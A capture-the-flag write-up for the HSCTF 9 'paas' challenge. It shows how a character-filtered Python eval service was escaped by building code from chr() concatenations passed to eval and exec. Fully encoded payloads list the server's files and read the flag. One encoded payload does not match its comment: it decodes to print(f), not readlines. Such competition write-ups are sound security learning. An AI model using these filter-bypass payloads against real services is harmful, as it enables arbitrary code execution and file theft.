## Introduction
The _paas (Python as a Service)_ was a Web challenge presented at the [HSCTF](https://ctf.hsctf.com/). The challenge contained a host to connect to using Netcat:

`nc HOST PORT`

The server returned the following message and a prompt:

```text
== proof-of-work: disabled ==
Python as a Service:
Execute arbitrary Python code (with certain restrictions)
>
```

The "certain restrictions" turned out to be the inability to use the following characters (among other):
- `.`
- ` ` (space)
- `=`
- square brackets
- `\`

It effectively invalidates any civilized attempts at writing code in Python. A less conventional method needs to be employed.

# Attack vector

After a while we figured out that calling the following is possible:
- `chr(n)` - a built-in function that returns a representation of the ASCII code point n. Example: `chr(105)` evaluates to `i`
- `+` - addition works
- `eval(...)` - evaluates Python code given to it as plaintext 
- `exec(...)` - executes Python code given to it as plaintext (it's somewhat different than `eval` though)

Therefore, any command can be executed using the template:

`eval(chr(i)+chr(j)+...+chr(n))` where i, j and n are relevant ASCII code points.

The assumption was that the flag is hidden in the filesystem. The plan was to:
- Write Python commands as we go
- Translate them to the match the character concatenation format
- Run them

For example, the command `import os` can be translated to:

`exec(chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115))`

# Execution
First, the following commands were run:
```python
import os
os.listdir()
```
The `listdir()` returned the following:
`['paas.py', 'flag']`

Now, all that's left was printing the contents of the flag:
```python
with open('flag', 'r') as f: print(f.readlines())
```
The result was:

`['flag{vuln3r4b1l17y_45_4_53rv1c3}\n']`

which was the correct answer.

All three commands translated to the char concatenation format were:
```python
exec(chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115)) # import os
eval(chr(111)+chr(115)+chr(46)+chr(108)+chr(105)+chr(115)+chr(116)+chr(100)+chr(105)+chr(114)+chr(40)+chr(41)) # os.listdir()
exec(chr(119)+chr(105)+chr(116)+chr(104)+chr(32)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(39)+chr(102)+chr(108)+chr(97)+chr(103)+chr(39)+chr(44)+chr(32)+chr(39)+chr(114)+chr(39)+chr(41)+chr(32)+chr(97)+chr(115)+chr(32)+chr(102)+chr(58)+chr(32)+chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(40)+chr(102)+chr(41)) # with open('flag', 'r') as f: print(f.readlines())
```

---

_HSCTF 9 was held on 06-11.06.2022_

_Shout out to [kzawistowski](https://github.com/kzawistowski) for participating in the CTF with me!_
